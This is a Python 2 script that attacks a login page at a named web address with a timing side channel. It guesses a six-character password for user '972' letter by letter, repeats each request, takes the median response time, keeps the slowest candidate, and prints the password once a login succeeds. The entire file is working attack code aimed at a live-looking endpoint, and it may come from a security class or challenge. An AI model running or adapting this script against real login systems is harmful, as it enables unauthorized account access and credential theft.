import string
import timeit
import time
import urllib
import urllib2

url = "http://viki-calnet.phpfogapp.com/login.php"

def find_password():
    
    data = {"user":"972", "pass":"000000"}
    max_time = 0
    max_letter = 'a'

    for i in range(6):
        for letter in string.lowercase:
            data['pass'] = data['pass'][:i] +  letter + data['pass'][i+1:]
            data_encoded = urllib.urlencode(data)
            req = urllib2.Request(url, data_encoded)

            count = [] 
            for i2 in range(5):
                try:
                    start = time.time()
                    response =  urllib2.urlopen(req)

                except urllib2.HTTPError, err:
                   
                    end = time.time()-start
                    count.append(end)
    
                else:
                    print "Success!"
                    print response.read()
                    print data['pass']
                    return
            
            median = sorted(count)[2]
            if median > max_time:
                max_time = median
                max_letter = letter
 
        #    print letter + ": " + str(median) 
       
        print "max: " + max_letter + " " + str(max_time)
        data['pass'] = data['pass'][:i] + max_letter + data['pass'][i+1:] 
        print "current password: ", data['pass']

if __name__=="__main__":
    find_password()
